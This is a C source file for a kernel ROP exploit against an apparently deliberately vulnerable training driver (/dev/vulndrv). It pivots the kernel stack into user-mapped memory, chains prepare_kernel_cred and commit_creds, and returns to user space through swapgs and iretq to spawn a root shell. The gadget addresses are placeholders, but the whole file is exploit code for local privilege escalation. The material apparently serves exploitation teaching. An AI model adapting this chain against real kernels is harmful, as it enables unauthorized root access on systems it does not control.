/**
 * ROP exploit for drv.c kernel module
 *
 * gcc rop_exploit.c -O2 -o rop_exploit
 *
 * Email: vnik@cyseclabs.com
 * Vitaly Nikolenko
 */

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>
#include "ropm.h"

#define DEVICE_PATH "/dev/vulndrv"

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;
unsigned long prepare_kernel_cred;
unsigned long commit_creds;

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "pushfq\n"
      "popq %2\n"
      : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory" 		);
}

void shell(void) {
  printf ("get shell\n");
  if(!getuid())
    system("/bin/sh");

  exit(0);
}

void usage(char *bin_name) {
  fprintf(stderr, "%s array_offset_decimal array_base_address_hex\n", bin_name);
}

int main(int argc, char *argv[])
{
  int fd;
  struct drv_req req;
  void *mapped, *temp_stack;
  unsigned long base_addr, stack_addr, mmap_addr, *fake_stack, pivot_addr;

  if (argc != 3) {
    usage(argv[0]);
    return -1;
  }
  req.offset = strtoul(argv[1], NULL, 10);
  base_addr  = strtoul(argv[2], NULL, 16);
  prepare_kernel_cred = 0xdead;
  commit_creds = 0xdead;
  printf("array base address = 0x%lx\n", base_addr);
  pivot_addr = base_addr + (req.offset * 8);
  stack_addr = pivot_addr & 0xffffffff;
  fprintf(stdout, "pivot address = 0x%lx\n", pivot_addr);
  fprintf(stdout, "stack address = 0x%lx\n", stack_addr);

  mmap_addr = stack_addr & 0xffff0000;
  assert((mapped = mmap((void*)mmap_addr, 0x20000, 7, 0x32, 0, 0)) == (void*)mmap_addr);
  assert((temp_stack = mmap((void*)0x30000000, 0x10000000, 7, 0x32, 0, 0)) == (void*)0x30000000);
  printf ("mmaped successfully %p\n", mmap_addr);
  char c;
  //scanf ("%c", &c);

  save_state();
  fake_stack = (unsigned long *)(stack_addr);
  *fake_stack ++= 0xdeadUL; /* pop rdi; ret */

  fake_stack = (unsigned long *)(stack_addr + 0xdead + 8);

  *fake_stack ++= 0x0UL;                /* NULL */
  *fake_stack ++= prepare_kernel_cred; /* prepare_kernel_cred() */

  *fake_stack ++= 0xdeadUL; /* pop rdx; ret */
  *fake_stack ++= commit_creds + 6; // commit_creds() + 2 instructions

  *fake_stack ++= 0xdeadUL; /* mov rdi, rax; call rdx */

  *fake_stack ++= 0xdeadUL; // swapgs ; pop rbp ; ret
  *fake_stack ++= 0xcafebabeUL;         // dummy placeholder

  *fake_stack ++= 0xdeadUL; /* iretq */
  *fake_stack ++= (unsigned long)shell; /* spawn a shell */
  *fake_stack ++= user_cs;              /* saved CS */
  *fake_stack ++= user_rflags;          /* saved EFLAGS */
  *fake_stack ++= (unsigned long)(temp_stack+0x5000000);  /* mmaped stack region in user space */
  *fake_stack ++= user_ss;              /* saved SS */


  //map = mmap((void *)..., ..., 3, 0x32, 0, 0);

  fd = open(DEVICE_PATH, O_RDONLY);

  if (fd == -1) {
    perror("open");
  }

  ioctl(fd, 0, &req);

  return 0;
}
